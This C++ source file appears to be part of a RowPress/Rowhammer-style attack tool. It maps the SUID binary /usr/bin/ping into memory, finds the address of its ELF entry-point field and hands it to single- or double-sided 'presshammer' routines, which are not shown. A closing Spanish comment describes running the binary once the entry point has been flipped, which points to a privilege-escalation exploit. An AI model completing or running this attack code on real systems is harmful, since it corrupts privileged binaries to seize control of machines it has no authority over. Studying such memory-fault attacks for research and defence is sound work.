#include "elf_header.h"


namespace color {
    constexpr const char* RESET  = "\033[0m";
    constexpr const char* RED    = "\033[31m";
    constexpr const char* GREEN  = "\033[32m";
    constexpr const char* YELLOW = "\033[33m";
    constexpr const char* BLUE   = "\033[34m";
}



int openBinary(){
    int fd = open("/usr/bin/ping", O_RDONLY);

    if(fd == -1){
        std::cerr << color::RED << "[!] " << color::RESET << "Error opening binary: /usr/bin/ping" << std::endl;
        perror("open");
        close(fd);
        exit(EXIT_FAILURE);
    }
    return fd;
}


void showElfHeader(Elf64_Ehdr *header){
    std::cout << "\n" << "------------------- " << color::RED << "/usr/bin/ping" << color::RESET << " -------------------" << "\n"
    << color::BLUE << "[*] " << color::RESET << "ELF header memory address: " << (void*) header << "\n"
    << color::BLUE << "[*] " << color::RESET << "Entry point: " << "0x" << header->e_entry << "\n"
    << color::BLUE << "[*] " << color::RESET << "Entry point memory address: " << (void*) & (header->e_entry) << "\n"
    << "------------------------------------------------" << "\n" << std::endl;
}


void checkElfHeader(bool isDoubleSided) {
    std::cout << color::BLUE << "[*] " << color::RESET << "CHECK ELF HEADER (E_ENTRY)" << std::endl;

    // opens the binary with SUID bit active or sudo permissions 
    int fd = openBinary();


    // gets binary size
    off_t size = lseek(fd, 0, SEEK_END);
    lseek(fd, 0, SEEK_SET);


    // mapping binary file in memory
    auto *mappedTarget = mmap(NULL, size, PROT_READ, MAP_PRIVATE, fd, 0);
    if (mappedTarget == MAP_FAILED) {
        std::cerr << color::RED << "[!] " << color::RESET << "mmap failed" << std::endl;
        perror("mmap");
        close(fd);
        exit(EXIT_FAILURE);
    }

    // access to ELF header 
    Elf64_Ehdr *header = (Elf64_Ehdr *) mappedTarget;


    // show elf header data
    showElfHeader(header);


    // gets target address
    volatile char *targetAddress = (volatile char *) & (header->e_entry);
    uintptr_t target = (uintptr_t) targetAddress;
    std::cout << color::GREEN << "[+] " << color::RESET << "Memory address target: " << std::hex << target << std::endl;


    if(isDoubleSided){
        doubleSidedPresshammer(target);
    }else{
        singleSidedPresshammer(target);
    }


    munmap(mappedTarget, size);
    close(fd);
    
    //hacer : lo que apunte en el movil + tener el binario cargado en memoria / ser rapido para ejecutar el binario con la nueva dirección --> tener el programa corriendo pimpimpim hay cambio, ejecutas
}